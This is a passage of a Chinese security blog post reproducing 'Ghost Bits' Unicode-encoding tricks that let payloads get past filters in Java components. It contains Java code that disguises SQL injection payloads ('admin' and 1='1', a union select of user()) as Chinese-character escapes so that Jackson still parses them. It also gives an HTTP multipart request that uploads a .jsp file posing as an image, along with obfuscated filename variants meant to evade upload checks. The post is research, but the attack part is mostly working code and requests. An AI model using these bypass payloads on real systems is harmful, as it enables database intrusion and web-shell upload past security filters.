+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;{&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;}&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;&#34;&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;:&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;,&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;\\u%04x&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">c</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">replaceUnicodeWithChinese</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Character</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">chineseMap</span><span class="p">,</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">5</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;\\u&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="s">&#34;\\u&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">4</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kt">char</span><span class="w"> </span><span class="n">hexChar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;</span><span class="w"> </span><span class="n">alternatives</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chineseMap</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">hexChar</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">alternatives</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">alternatives</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="kt">char</span><span class="w"> </span><span class="n">replacement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alternatives</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="na">nextInt</span><span class="p">(</span><span class="n">alternatives</span><span class="p">.</span><span class="na">size</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">replacement</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">hexChar</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">unicodeJson</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ghostbitsBypass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.core.JsonProcessingException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.ObjectMapper</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ghost</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Character</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Character</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">chineseMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">getChineseHexMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Random</span><span class="w"> </span><span class="n">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">JsonProcessingException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;username\&#34;:\&#34;admin&#39; and 1=&#39;1 \&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;username\&#34;:\&#34;admin&#39; and 1=&#39;2 \&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;{\&#34;username\&#34;:\&#34;1&#39; union select 1,user(),3,4 -- \&#34;}&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">payload</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">encodeJsonToUnicode</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GhostBitsGenerator</span><span class="p">.</span><span class="na">replaceUnicodeWithChinese</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">chineseMap</span><span class="p">,</span><span class="w"> </span><span class="n">random</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectMapper</span><span class="w"> </span><span class="n">mapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectMapper</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mapper</span><span class="p">.</span><span class="na">readValue</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519203907911.png"
+	width="1741"
+	height="229"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519203907911_hu2971865304824158736.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519203907911_hu4915332464683037162.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519203907911"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="760"
+		data-flex-basis="1824px"
+	
+></p>
+<p>不过研究jackson本质是想利用这个打springboot的，但是jackson的本地解析走的是<code>ReaderBasedJsonParser</code>,也就满足ch是char类型，而springboot走的是<code>UTF8StreamJsonParser</code>，ch是byte类型就没法利用</p>
+<p>这里询问ai说是要使springboot切换到jackson的<code>ReaderBasedJsonParser</code>解析才行，也就是换请求头中的<code>Content-Type: application/json; charset=utf-16</code>,因为<code>UTF8StreamJsonParser</code>顾名思义就是解析utf-8的，如果换成别的编码，就会回退到jackson解析，具体我没去实验(</p>
+<h2 id="becl">becl
+</h2><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519214201492.png"
+	width="1550"
+	height="811"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519214201492_hu12534925291270590884.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519214201492_hu10572108732438934644.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519214201492"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="458px"
+	
+></p>
+<p>还是之前<code>ByteArrayOutputStream</code>的write的转换问题</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215257043.png"
+	width="1122"
+	height="395"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215257043_hu3386538054001619721.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215257043_hu8924114417542577208.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519215257043"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="681px"
+	
+></p>
+<p>不多说了，跟上面一样其实，就是把<code>$$BCEL$$</code>后的字节码变成</p>
+<h2 id="tomcat-upload">tomcat upload
+</h2><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215515209.png"
+	width="1540"
+	height="770"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215515209_hu9130228407376472931.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519215515209_hu10479933634573921006.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519215515209"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221039130.png"
+	width="1166"
+	height="826"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221039130_hu14366979585475210482.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221039130_hu6518288569956863999.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519221039130"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="141"
+		data-flex-basis="338px"
+	
+></p>
+<p>这个也一样，原先的bypass是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/upload/img</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">185</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundarycCYhwj56XpogMIa0</span>
+</span></span><span class="line"><span class="cl"><span class="err">------WebKitFormBoundarycCYhwj56XpogMIa0</span>
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;;filename*=&#34;UTF-8&#39;&#39;1.jsp&#34;
+</span></span><span class="line"><span class="cl">Content-Type: image/png
+</span></span><span class="line"><span class="cl">test
+</span></span><span class="line"><span class="cl">------WebKitFormBoundarycCYhwj56XpogMIa0--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原先的<code>UTF-8''1.jsp</code>还能进一步替换成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">filename*=&#34;UTF-8&#39;&#39;1.jsp&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">filename*=&#34;UTF-8&#39;&#39;1.%6asp&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">filename*=&#34;UTF-8&#39;&#39;1.%鸶繡sp&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">filename*=&#34;UTF-8&#39;&#39;1.汪癳絰&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="urldecoder">URLDecoder
+</h2><p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221820289.png"
+	width="1544"
+	height="744"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221820289_hu15306171965677023189.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519221820289_hu12550957392252609079.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519221820289"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<p>最熟悉的一集，此事在bottle ssti的bypass中亦有记载（</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519222612374.png"
+	width="1341"
+	height="577"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519222612374_hu2764254740158972962.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519222612374_hu8913133079859783325.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519222612374"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="232"
+		data-flex-basis="557px"
+	
+></p>
+<p>这个跟上面的那个fastjson几乎一模一样</p>
+<h2 id="小结">小结
+</h2><p>现在yakit也上插件了，可以随时随地构造</p>
+<p><img src="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519224212230.png"
+	width="1213"
+	height="322"
+	srcset="/p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519224212230_hu6621242255185908368.png 480w, /p/ghost-bits%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20260519224212230_hu17700243679350347928.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260519224212230"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="376"
+		data-flex-basis="904px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">Java</a>
+        
+            <a href="/tags/ghost-bits/">Ghost Bits</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.48fd28d6a8e7cc9bb5b9a9cc4916e6a6.jpg" 
+                        width="2500" 
+                        height="2156" 
+                        loading="lazy"
+                        alt="Featured image of post java二次反序列化"
+                        
+                        data-hash="md5-SP0o1qjnzJu1uanMSRbmpg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java二次反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.9ae5c6e372a0304f6a8d57f2459be526.webp" 
+                        width="4440" 
+                        height="2760" 
+                        loading="lazy"
+                        alt="Featured image of post Rome反序列化"
+                        
+                        data-hash="md5-muXG43KgME9qjVfyRZvlJg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Rome反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.933cb51d495143a9fc80c1187e87ca0b.jpg" 
+                        width="1674" 
+                        height="2976" 
+                        loading="lazy"
+                        alt="Featured image of post Hessian反序列化"
+                        
+                        data-hash="md5-kzy1HUlRQ6n8gMEYfofKCw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Hessian反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E5%86%85%E5%AD%98%E9%A9%AC/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E5%86%85%E5%AD%98%E9%A9%AC/1.f4e77127f2e801a7bba91fcd64064fda.jpg" 
+                        width="1722" 
+                        height="2435" 
+                        loading="lazy"
+                        alt="Featured image of post java内存马"
+                        
+                        data-hash="md5-9OdxJ/LoAae7qR/NZAZP2g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">java内存马</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/el%E8%A1%A8%E8%BE%BE%E5%BC%8Fspel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/el%E8%A1%A8%E8%BE%BE%E5%BC%8Fspel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1.7ebca9ad010efaea9c0f0e869456942f.webp" 
+                        width="1200" 
+                        height="2415" 
+                        loading="lazy"
+                        alt="Featured image of post EL表达式&amp;&amp;SPEL表达式注入学习"
+                        
+                        data-hash="md5-fryprQEO&#43;uqcDw6GlFaULw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">EL表达式&amp;&amp;SPEL表达式注入学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
